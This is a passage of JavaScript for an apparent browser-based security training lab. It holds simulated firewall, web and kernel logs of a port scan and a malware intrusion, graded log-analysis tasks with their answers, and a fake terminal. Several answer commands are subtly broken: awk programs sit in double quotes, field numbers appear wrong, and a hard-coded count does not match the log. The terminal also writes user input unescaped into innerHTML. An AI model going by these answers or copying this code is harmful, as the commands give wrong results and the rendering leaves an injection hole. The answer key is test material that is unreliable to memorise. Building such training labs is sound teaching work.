2024-01-15 10:17:40 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12359 DF PROTO=TCP SPT=54335 DPT=5432 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:18:55 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12360 DF PROTO=TCP SPT=54336 DPT=6379 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:20:10 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12361 DF PROTO=TCP SPT=54337 DPT=27017 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:21:25 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12362 DF PROTO=TCP SPT=54338 DPT=5984 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:22:40 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12363 DF PROTO=TCP SPT=54339 DPT=8080 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:23:55 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12364 DF PROTO=TCP SPT=54340 DPT=8443 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:25:10 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12365 DF PROTO=TCP SPT=54341 DPT=9000 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:26:25 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12366 DF PROTO=TCP SPT=54342 DPT=9200 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:27:40 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12367 DF PROTO=TCP SPT=54343 DPT=11211 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:28:55 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12368 DF PROTO=TCP SPT=54344 DPT=27018 WINDOW=65535 RES=0x00 SYN URGP=0
2024-01-15 10:30:10 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:ca:05:00:15:5d:01:ca:06:08:00 SRC=185.220.101.45 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12369 DF PROTO=TCP SPT=54345 DPT=50070 WINDOW=65535 RES=0x00 SYN URGP=0`,
        tasks: [
            {
                id: 'network_1',
                description: 'Count total firewall blocks in network.log',
                command: 'grep "UFW BLOCK" network.log | wc -l',
                points: 10,
                hint: 'Use wc -l to count lines in network.log',
                answer: 'grep "UFW BLOCK" network.log | wc -l'
            },
            {
                id: 'network_2',
                description: 'Extract all destination ports being scanned',
                command: 'grep "UFW BLOCK" network.log | awk "{print $NF}" | sort | uniq',
                points: 20,
                hint: 'Use awk to get the last field (DPT=port) from network.log',
                answer: 'grep "UFW BLOCK" network.log | awk "{print $NF}" | sort | uniq'
            },
            {
                id: 'network_3',
                description: 'Find the source IP address of the attack',
                command: 'grep "UFW BLOCK" network.log | awk "{print $10}" | head -1',
                points: 15,
                hint: 'Extract the SRC field from the first line in network.log',
                answer: 'grep "UFW BLOCK" network.log | awk "{print $10}" | head -1'
            },
            {
                id: 'network_4',
                description: 'Count how many different ports were targeted',
                command: 'grep "UFW BLOCK" network.log | awk "{print $NF}" | sort | uniq | wc -l',
                points: 25,
                hint: 'Combine awk, sort, uniq, and wc to count unique ports in network.log',
                answer: 'grep "UFW BLOCK" network.log | awk "{print $NF}" | sort | uniq | wc -l'
            },
            {
                id: 'network_5',
                description: 'Identify this as a port scan attack',
                command: 'echo "Port scan detected from 185.220.101.45"',
                points: 30,
                hint: 'This is a classic port scanning pattern',
                answer: 'echo "Port scan detected from 185.220.101.45"'
            }
        ],
        hints: "Key commands: grep, awk, wc, sort, uniq. Focus on pattern extraction and counting."
    },

    'log-analysis': {
        title: "Log Analysis",
        description: "Analyze various log files to identify security events, errors, and suspicious activities.",
        logFile: `2024-01-15 12:00:01 apache2[1234]: 192.168.1.100 - - [15/Jan/2024:12:00:01 +0000] "GET /api/users HTTP/1.1" 200 1234
2024-01-15 12:01:15 apache2[1235]: 192.168.1.101 - - [15/Jan/2024:12:01:15 +0000] "POST /api/login HTTP/1.1" 401 567
2024-01-15 12:02:30 apache2[1236]: 192.168.1.102 - - [15/Jan/2024:12:02:30 +0000] "GET /admin HTTP/1.1" 403 0
2024-01-15 12:03:45 apache2[1237]: 192.168.1.103 - - [15/Jan/2024:12:03:45 +0000] "POST /api/upload HTTP/1.1" 200 234
2024-01-15 12:04:12 apache2[1238]: 192.168.1.104 - - [15/Jan/2024:12:04:12 +0000] "GET /wp-admin HTTP/1.1" 404 485
2024-01-15 12:05:33 apache2[1239]: 192.168.1.105 - - [15/Jan/2024:12:05:33 +0000] "POST /api/login HTTP/1.1" 401 567
2024-01-15 12:06:18 apache2[1240]: 192.168.1.106 - - [15/Jan/2024:12:06:18 +0000] "GET /phpmyadmin HTTP/1.1" 404 485
2024-01-15 12:07:45 apache2[1241]: 192.168.1.107 - - [15/Jan/2024:12:07:45 +0000] "POST /api/login HTTP/1.1" 401 567
2024-01-15 12:08:22 apache2[1242]: 192.168.1.108 - - [15/Jan/2024:12:08:22 +0000] "GET /admin HTTP/1.1" 403 0
2024-01-15 12:09:15 apache2[1243]: 192.168.1.109 - - [15/Jan/2024:12:09:15 +0000] "POST /api/login HTTP/1.1" 401 567
2024-01-15 12:10:33 apache2[1244]: 192.168.1.110 - - [15/Jan/2024:12:10:33 +0000] "GET /wp-admin HTTP/1.1" 404 485
2024-01-15 12:11:45 apache2[1245]: 192.168.1.111 - - [15/Jan/2024:12:11:45 +0000] "POST /api/login HTTP/1.1" 401 567
2024-01-15 12:12:18 apache2[1246]: 192.168.1.112 - - [15/Jan/2024:12:12:18 +0000] "GET /phpmyadmin HTTP/1.1" 404 485
2024-01-15 12:13:33 apache2[1247]: 192.168.1.113 - - [15/Jan/2024:12:13:33 +0000] "POST /api/login HTTP/1.1" 401 567
2024-01-15 12:14:45 apache2[1248]: 192.168.1.114 - - [15/Jan/2024:12:14:45 +0000] "GET /admin HTTP/1.1" 403 0
2024-01-15 12:15:18 apache2[1249]: 192.168.1.115 - - [15/Jan/2024:12:15:18 +0000] "POST /api/login HTTP/1.1" 401 567
2024-01-15 12:16:33 apache2[1250]: 192.168.1.116 - - [15/Jan/2024:12:16:33 +0000] "GET /wp-admin HTTP/1.1" 404 485
2024-01-15 12:17:45 apache2[1251]: 192.168.1.117 - - [15/Jan/2024:12:17:45 +0000] "POST /api/login HTTP/1.1" 401 567
2024-01-15 12:18:22 apache2[1252]: 192.168.1.118 - - [15/Jan/2024:12:18:22 +0000] "GET /phpmyadmin HTTP/1.1" 404 485
2024-01-15 12:19:15 apache2[1253]: 192.168.1.119 - - [15/Jan/2024:12:19:15 +0000] "POST /api/login HTTP/1.1" 401 567`,
        tasks: [
            {
                id: 'log_1',
                description: 'Count total HTTP requests in access.log',
                command: 'wc -l access.log',
                points: 10,
                hint: 'Use wc to count lines in access.log file',
                answer: 'wc -l access.log'
            },
            {
                id: 'log_2',
                description: 'Find all failed login attempts (401 status)',
                command: 'grep "401" access.log',
                points: 20,
                hint: 'Search for 401 status codes in access.log',
                answer: 'grep "401" access.log'
            },
            {
                id: 'log_3',
                description: 'Identify IP addresses making failed login attempts',
                command: 'grep "401" access.log | awk "{print $1}" | sort | uniq -c',
                points: 25,
                hint: 'Extract IP addresses and count occurrences from access.log',
                answer: 'grep "401" access.log | awk "{print $1}" | sort | uniq -c'
            },
            {
                id: 'log_4',
                description: 'Find suspicious admin access attempts',
                command: 'grep "admin" access.log',
                points: 20,
                hint: 'Search for admin access attempts in access.log',
                answer: 'grep "admin" access.log'
            },
            {
                id: 'log_5',
                description: 'Count different HTTP status codes',
                command: 'awk "{print $9}" access.log | sort | uniq -c',
                points: 25,
                hint: 'Extract status codes and count them from access.log',
                answer: 'awk "{print $9}" access.log | sort | uniq -c'
            }
        ],
        hints: "Key commands: grep, awk, wc, sort, uniq. Focus on HTTP status code analysis and IP tracking."
    },

    'forensics': {
        title: "Digital Forensics",
        description: "Conduct digital forensics analysis to investigate security incidents and gather evidence.",
        logFile: `2024-01-15 15:30:01 kernel: [ALERT] Suspicious process created: PID 12345, PPID 1, CMD: /tmp/malware.sh
2024-01-15 15:31:15 kernel: [WARN] Process 12345 attempting to modify system files
2024-01-15 15:32:30 kernel: [ALERT] Process 12345 creating network connections to 185.220.101.45:4444
2024-01-15 15:33:45 kernel: [WARN] Process 12345 attempting to escalate privileges
2024-01-15 15:34:12 kernel: [ALERT] Process 12345 modifying /etc/passwd
2024-01-15 15:35:33 kernel: [WARN] Process 12345 creating backdoor user account
2024-01-15 15:36:18 kernel: [ALERT] Process 12345 downloading additional payload from 185.220.101.45
2024-01-15 15:37:45 kernel: [WARN] Process 12345 attempting to disable firewall
2024-01-15 15:38:22 kernel: [ALERT] Process 12345 modifying system startup scripts
2024-01-15 15:39:15 kernel: [WARN] Process 12345 attempting to hide from process list
2024-01-15 15:40:33 kernel: [ALERT] Process 12345 creating persistence mechanism
2024-01-15 15:41:18 kernel: [WARN] Process 12345 attempting to exfiltrate data
2024-01-15 15:42:45 kernel: [ALERT] Process 12345 modifying system logs
2024-01-15 15:43:22 kernel: [WARN] Process 12345 attempting to disable antivirus
2024-01-15 15:44:15 kernel: [ALERT] Process 12345 creating additional network connections
2024-01-15 15:45:33 kernel: [WARN] Process 12345 attempting to spread to other systems
2024-01-15 15:46:18 kernel: [ALERT] Process 12345 modifying system configuration files
2024-01-15 15:47:45 kernel: [WARN] Process 12345 attempting to establish command and control
2024-01-15 15:48:22 kernel: [ALERT] Process 12345 creating scheduled tasks for persistence
2024-01-15 15:49:15 kernel: [WARN] Process 12345 attempting to disable security monitoring`,
        tasks: [
            {
                id: 'forensics_1',
                description: 'Identify suspicious process activity in dmesg.log',
                command: 'grep -i "suspicious\|alert" dmesg.log',
                points: 15,
                hint: 'Search for suspicious activity in dmesg.log kernel logs',
                answer: 'grep -i "suspicious\|alert" dmesg.log'
            },
            {
                id: 'forensics_2',
                description: 'Find process creation events',
                command: 'grep "process.*created" dmesg.log',
                points: 20,
                hint: 'Look for process creation events in dmesg.log',
                answer: 'grep "process.*created" dmesg.log'
            },
            {
                id: 'forensics_3',
                description: 'Identify network connections to suspicious IPs',
                command: 'grep "185.220.101.45" dmesg.log',
                points: 25,
                hint: 'Search for connections to suspicious IP in dmesg.log',
                answer: 'grep "185.220.101.45" dmesg.log'
            },
            {
                id: 'forensics_4',
                description: 'Find privilege escalation attempts',
                command: 'grep -i "privilege\|escalat" dmesg.log',
                points: 20,
                hint: 'Search for privilege escalation attempts in dmesg.log',
                answer: 'grep -i "privilege\|escalat" dmesg.log'
            },
            {
                id: 'forensics_5',
                description: 'Count total security alerts',
                command: 'grep -c "ALERT" dmesg.log',
                points: 20,
                hint: 'Count alert messages in dmesg.log',
                answer: 'grep -c "ALERT" dmesg.log'
            }
        ],
        hints: "Key commands: grep, awk, wc, dmesg, journalctl. Focus on process analysis and security event correlation."
    }
};

// Initialize the lab
document.addEventListener('DOMContentLoaded', function() {
    selectRole('admin');
    updateScore();
});

// Select role (System Admin or Cybersecurity Analyst)
function selectRole(role) {
    currentRole = role;
    completedTasks.clear();
    
    // Update active role button
    document.querySelectorAll('.role-btn').forEach(btn => {
        btn.classList.remove('active');
    });
    event.target.classList.add('active');
    
    // Show scenario selector
    document.getElementById('scenarioSelector').style.display = 'block';
    
    // Show appropriate scenarios based on role
    if (role === 'admin') {
        document.querySelector('.admin-scenarios').style.display = 'flex';
        document.querySelector('.security-scenarios').style.display = 'none';
        loadScenario('system-monitoring');
    } else {
        document.querySelector('.admin-scenarios').style.display = 'none';
        document.querySelector('.security-scenarios').style.display = 'flex';
        loadScenario('intrusion-detection');
    }
}

// Load a specific scenario
function loadScenario(scenarioName) {
    currentScenario = scenarioName;
    completedTasks.clear();
    
    // Show terminal and challenge sections
    document.getElementById('terminalSection').style.display = 'block';
    document.getElementById('challengeSection').style.display = 'block';
    
    // Update active button
    document.querySelectorAll('.scenario-btn').forEach(btn => {
        btn.classList.remove('active');
    });
    event.target.classList.add('active');
    
    const scenario = scenarios[scenarioName];
    
    // Load log content
    document.getElementById('logContent').textContent = scenario.logFile;
    
    // Load challenge description
    document.getElementById('challengeDescription').textContent = scenario.description;
    
    // Load tasks
    const tasksContainer = document.getElementById('challengeTasks');
    tasksContainer.innerHTML = '';
    scenario.tasks.forEach(task => {
        const taskElement = document.createElement('div');
        taskElement.className = 'task-item';
        taskElement.innerHTML = `
            <strong>${task.description}</strong> (${task.points} points)
            <br><button class="show-answer-btn" onclick="showAnswer('${task.id}', \`${task.answer}\`)">
                <i class="fas fa-eye"></i> Click to Show Answer
            </button>
            <div id="answer-${task.id}" class="answer-hidden"></div>
        `;
        tasksContainer.appendChild(taskElement);
    });
    
    // Load hints
    document.getElementById('hintContent').textContent = scenario.hints;
    
    // Reset score for new scenario
    currentScore = 0;
    updateScore();
}

// Handle command execution
function handleCommand(event) {
    if (event.key === 'Enter') {
        const command = event.target.value.trim();
        if (command) {
            executeCommand(command);
            event.target.value = '';
        }
    }
}

// Execute command and check for task completion
function executeCommand(command) {
    const scenario = scenarios[currentScenario];
    let output = '';
    
    // Simulate command execution
    if (command.includes('grep') || command.includes('awk') || command.includes('wc') || command.includes('sort') || command.includes('uniq') || command.includes('dmesg') || command.includes('uptime') || command.includes('ps') || command.includes('free') || command.includes('df') || command.includes('netstat') || command.includes('systemctl') || command.includes('tar') || command.includes('du') || command.includes('ls') || command.includes('iostat')) {
        // Basic command simulation
        if (command.includes('grep "Failed password"')) {
            output = `2024-01-15 08:31:22 sshd[1235]: Failed password for root from 192.168.1.101 port 22
2024-01-15 08:31:25 sshd[1236]: Failed password for root from 192.168.1.101 port 22
2024-01-15 08:31:28 sshd[1237]: Failed password for root from 192.168.1.101 port 22`;
        } else if (command.includes('grep "UFW BLOCK"') && command.includes('wc -l')) {
            output = '20';
        } else if (command.includes('awk "{print $11}"') && command.includes('uniq -c')) {
            output = '      3 192.168.1.101';
        } else if (command.includes('dmesg') && command.includes('grep -i error')) {
            output = `2024-01-15 10:00:01 kernel: [ERROR] Out of memory: Kill process 1234 (java) score 987 or sacrifice child
2024-01-15 10:05:33 kernel: [ERROR] ata1.00: exception Emask 0x0 SAct 0x0 SErr 0x0 action 0x0
2024-01-15 10:09:15 kernel: [ERROR] Out of memory: Kill process 2345 (apache2) score 654 or sacrifice child
2024-01-15 10:14:45 kernel: [ERROR] ata1.00: exception Emask 0x0 SAct 0x0 SErr 0x0 action 0x0
2024-01-15 10:17:45 kernel: [ERROR] Failed to start elasticsearch.service: Unit elasticsearch.service not found.`;
        } else if (command.includes('uptime')) {
            output = '14:30:15 up 2 days, 3:45, 2 users, load average: 2.34, 1.89, 1.23';
        } else if (command.includes('ps aux')) {
            output = `USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root      1234 45.2 12.3 2345678 123456 ?        S    10:00   2:34 java
www-data  2345 23.1  8.9 1234567  98765 ?        S    10:01   1:23 apache2
mysql     3456 18.7 15.2 3456789 234567 ?        S    10:02   3:45 mysqld
user      4567 12.3  4.5  567890  12345 pts/0    S    10:03   0:45 python`;
        } else if (command.includes('free -h')) {
            output = `              total        used        free      shared  buff/cache   available
Mem:           8.0Gi       3.4Gi       2.3Gi       238Mi       2.4Gi       4.5Gi
Swap:          2.0Gi       1.0Gi       1.0Gi`;
        } else if (command.includes('df -h')) {
            output = `Filesystem      Size  Used Avail Use% Mounted on
/dev/sda1       100G   45G   50G  47% /
/dev/sdb1       500G  200G  275G  42% /home
tmpfs           3.2G     0  3.2G   0% /dev/shm`;
        } else if (command.includes('netstat -tuln')) {
            output = `Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:22             0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:80             0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:443            0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:3306         0.0.0.0:*               LISTEN`;
        } else if (command.includes('systemctl --failed')) {
            output = `UNIT                    LOAD   ACTIVE SUB    DESCRIPTION
apache2.service         loaded failed failed The Apache HTTP Server
mysql.service          loaded failed failed MySQL Community Server
nginx.service          loaded failed failed A high performance web server`;
        } else if (command.includes('iostat')) {
            output = `Linux 5.4.0-42-generic (server)  01/15/2024  _x86_64_        (4 CPU)

avg-cpu:  %user   %nice %system %iowait  %steal   %idle
          15.20    0.00    8.10    0.80    0.00   75.90

Device            tps    kB_read/s    kB_wrtn/s    kB_read    kB_wrtn
sda              45.2       1234.5      2345.6    12345678   23456789
sdb              12.3        567.8       890.1     5678901    8901234`;
        } else {
            output = 'Command executed successfully.';
        }
    } else {
        output = 'Command not recognized or no output.';
    }
    
    // Display output
    const terminalOutput = document.getElementById('terminalOutput');
    const outputElement = document.createElement('div');
    outputElement.innerHTML = `
        <div style="color: #00ff00;">analyst@security-lab:~$ ${command}</div>
        <div style="color: #ffffff; margin-bottom: 1rem;">${output}</div>
    `;
    terminalOutput.appendChild(outputElement);
    terminalOutput.scrollTop = terminalOutput.scrollHeight;
    
    // Check for task completion
    checkTaskCompletion(command, output);
}

    // Check if command completes a task
    function checkTaskCompletion(command, output) {
        const scenario = scenarios[currentScenario];
        
        scenario.tasks.forEach(task => {
            if (!completedTasks.has(task.id)) {
                // More specific pattern matching for task completion
                const taskCommand = task.command.toLowerCase();
                const userCommand = command.toLowerCase();
                
                // Check for exact command match or specific patterns
                if (userCommand === taskCommand ||
                    (taskCommand.includes('uptime') && userCommand.includes('uptime')) ||
                    (taskCommand.includes('ps aux') && userCommand.includes('ps aux')) ||
                    (taskCommand.includes('free -h') && userCommand.includes('free -h')) ||
                    (taskCommand.includes('df -h') && userCommand.includes('df -h')) ||
                    (taskCommand.includes('netstat -tuln') && userCommand.includes('netstat -tuln')) ||
                    (taskCommand.includes('dmesg') && userCommand.includes('dmesg') && userCommand.includes('grep -i error')) ||
                    (taskCommand.includes('grep "failed password"') && userCommand.includes('grep "failed password"')) ||
                    (taskCommand.includes('grep "ufw block"') && userCommand.includes('grep "ufw block"') && userCommand.includes('wc -l')) ||
                    (taskCommand.includes('awk "{print $11}"') && userCommand.includes('awk "{print $11}"') && userCommand.includes('uniq -c')) ||
                    (taskCommand.includes('grep "401"') && userCommand.includes('grep "401"')) ||
                    (taskCommand.includes('grep "admin"') && userCommand.includes('grep "admin"')) ||
                    (taskCommand.includes('grep -i "suspicious"') && userCommand.includes('grep -i "suspicious"')) ||
                    (taskCommand.includes('grep "185.220.101.45"') && userCommand.includes('grep "185.220.101.45"')) ||
                    (taskCommand.includes('systemctl --failed') && userCommand.includes('systemctl --failed')) ||
                    (taskCommand.includes('df -h') && userCommand.includes('df -h') && userCommand.includes('grep -e')) ||
                    (taskCommand.includes('free -h') && userCommand.includes('free -h')) ||
                    (taskCommand.includes('netstat -tuln') && userCommand.includes('netstat -tuln') && userCommand.includes('grep -e'))) {
                    
                    completedTasks.add(task.id);
                    currentScore += task.points;
                    updateScore();
                    
                    // Show completion message
                    const completionMsg = document.createElement('div');
                    completionMsg.style.color = '#00ff00';
                    completionMsg.style.fontWeight = 'bold';
                    completionMsg.textContent = `✅ Task completed: ${task.description} (+${task.points} points)`;
                    
                    const terminalOutput = document.getElementById('terminalOutput');
                    terminalOutput.appendChild(completionMsg);
                    terminalOutput.scrollTop = terminalOutput.scrollHeight;
                }
            }
        });
    }

// Show answer function
function showAnswer(taskId, answer) {
    const answerElement = document.getElementById(`answer-${taskId}`);
    const button = event.target.closest('.show-answer-btn');
    
    if (answerElement.classList.contains('answer-hidden')) {
        answerElement.innerHTML = `<div class="answer-content"><strong>Answer:</strong> <code>${answer}</code></div>`;
        answerElement.classList.remove('answer-hidden');
        answerElement.classList.add('answer-visible');
        button.innerHTML = '<i class="fas fa-eye-slash"></i> Hide Answer';
    } else {
        answerElement.innerHTML = '';
        answerElement.classList.remove('answer-visible');
        answerElement.classList.add('answer-hidden');
        button.innerHTML = '<i class="fas fa-eye"></i> Click to Show Answer';
    }
}

// Update score display
function updateScore() {
    const maxScore = scenarios[currentScenario].tasks.reduce((sum, task) => sum + task.points, 0);
    const percentage = Math.round((currentScore / maxScore) * 100);
    
    document.getElementById('scoreDisplay').textContent = `${currentScore}/${maxScore}`;
    document.getElementById('progressFill').style.width = `${percentage}%`;
} 